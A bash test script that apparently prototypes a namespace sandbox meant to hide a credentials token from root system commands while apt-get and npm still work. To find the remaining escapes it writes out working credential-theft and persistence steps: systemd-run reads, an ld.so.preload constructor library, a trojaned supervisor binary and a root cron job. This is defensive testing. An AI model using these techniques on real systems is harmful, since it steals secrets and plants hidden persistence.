#!/bin/bash
# Option A on a throwaway machine, as root: does hiding private/ in a namespace keep the token
# from a root system command while apt-get and npm -g still work, and which escapes remain?
#
#   sudo NPM_DIR="$(dirname "$(command -v npm)")" bash prototype/token/option-a.sh
set -u
here=$(cd "$(dirname "$0")" && pwd)
. "$here/lib.sh"
export PATH="$NPM_DIR:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export DEBIAN_FRONTEND=noninteractive

# confined <variant> <shell line>: the line as a system command under option A.
confined() {
  unshare --mount --pid --fork --mount-proc --propagation private \
    /bin/bash "$here/confine.sh" "$1" /bin/bash -c "$2"
}
cleanup_installs() {
  apt-get purge -y -q hello figlet >/dev/null 2>&1
  npm uninstall -g cowsay >/dev/null 2>&1
}

echo "== unconfined root, today's system access"
check "root reads the token" ok grep -q "$TOKEN" "$PRIVATE/credentials.json"

echo "== basic: private/ and block devices hidden, capabilities dropped"
check "apt-get install -y hello" ok confined basic "apt-get install -y -q hello"
check "npm install -g cowsay" ok confined basic "npm install -g cowsay"
check "hello and cowsay run" ok confined basic "hello && cowsay installed"
check "cat private/credentials.json" fail confined basic "cat $PRIVATE/credentials.json"
check "cat /proc/1/root/private/credentials.json" fail confined basic "cat /proc/1/root$PRIVATE/credentials.json"
check "no supervisor process is visible" fail confined basic "ps -eo comm | grep -v -e ps -e bash -e grep -e COMMAND"
check "umount the mask" fail confined basic "umount $PRIVATE"
check "mount a new proc or tmpfs" fail confined basic "mount -t tmpfs x /mnt"
check "a block device is visible" fail confined basic "ls /dev | grep -E '^(sd|nvme|vd|xvd|loop|root|mapper)'"
check "mknod a block device" fail confined basic "mknod /tmp/hs-disk b 8 0"
check "escape: systemd-run cat the token" ok confined basic \
  "systemd-run --quiet --wait --pipe --collect cat $PRIVATE/credentials.json | grep -q $TOKEN"
cleanup_installs

echo "== plus: also systemd and D-Bus sockets hidden, /sys and /proc/sys read-only"
check "apt-get install -y hello" ok confined plus "apt-get install -y -q hello"
check "npm install -g cowsay" ok confined plus "npm install -g cowsay"
check "cat private/credentials.json" fail confined plus "cat $PRIVATE/credentials.json"
check "escape: systemd-run cat the token" fail confined plus \
  "systemd-run --quiet --wait --pipe --collect cat $PRIVATE/credentials.json"
check "escape: write core_pattern" fail confined plus "echo '|/tmp/x' > /proc/sys/kernel/core_pattern"

echo "== plus: persistence a root system command can still leave"
printf '#!/bin/sh\necho supervisor\n' >/usr/local/bin/hs-proto-supervisor
chmod 755 /usr/local/bin/hs-proto-supervisor
check "replace the supervisor's binary" ok confined plus \
  "printf '#!/bin/sh\ncat $PRIVATE/credentials.json > /tmp/hs-binary\n' > /usr/local/bin/hs-proto-supervisor"
/usr/local/bin/hs-proto-supervisor
check "  the next start, as root, hands it the token" ok stolen /tmp/hs-binary

check "write /etc/ld.so.preload" ok confined plus "
  printf '%s\n' '#include <fcntl.h>' '#include <unistd.h>' \
    '__attribute__((constructor)) static void steal(void) {' \
    '  char b[4096]; int i = open(\"$PRIVATE/credentials.json\", O_RDONLY); if (i < 0) return;' \
    '  int o = open(\"/tmp/hs-preload\", O_WRONLY|O_CREAT|O_TRUNC, 0644); ssize_t n = read(i, b, sizeof b);' \
    '  if (o >= 0 && n > 0) write(o, b, n); }' > /tmp/hs.c &&
  gcc -shared -fPIC -o /usr/local/lib/hs-proto.so /tmp/hs.c && echo /usr/local/lib/hs-proto.so > /etc/ld.so.preload"
/bin/true
rm -f /etc/ld.so.preload
check "  the next root process anywhere hands it the token" ok stolen /tmp/hs-preload

if systemctl is-active --quiet cron; then
  check "write /etc/cron.d" ok confined plus \
    "echo '* * * * * root cat $PRIVATE/credentials.json > /tmp/hs-cron' > /etc/cron.d/hs-proto"
  for _ in $(seq 1 75); do stolen /tmp/hs-cron && break; sleep 1; done
  rm -f /etc/cron.d/hs-proto
  check "  within a minute cron, as root, hands it the token" ok stolen /tmp/hs-cron
else
  echo "skipped: cron is not running here"
fi
cleanup_installs

echo "== ro-etc: plus with /etc read-only"
check "write /etc/cron.d" fail confined ro-etc "echo x > /etc/cron.d/hs-proto"
check "apt-get install -y hello (no files in /etc)" ok confined ro-etc "apt-get install -y -q hello"
check "apt-get install -y figlet (update-alternatives)" fail confined ro-etc "apt-get install -y -q figlet"
check "npm install -g cowsay" ok confined ro-etc "npm install -g cowsay"
check "replace the supervisor's binary" ok confined ro-etc "echo x > /usr/local/bin/hs-proto-supervisor"
dpkg --configure -a >/dev/null 2>&1
cleanup_installs
rm -f /usr/local/bin/hs-proto-supervisor /usr/local/lib/hs-proto.so

finish
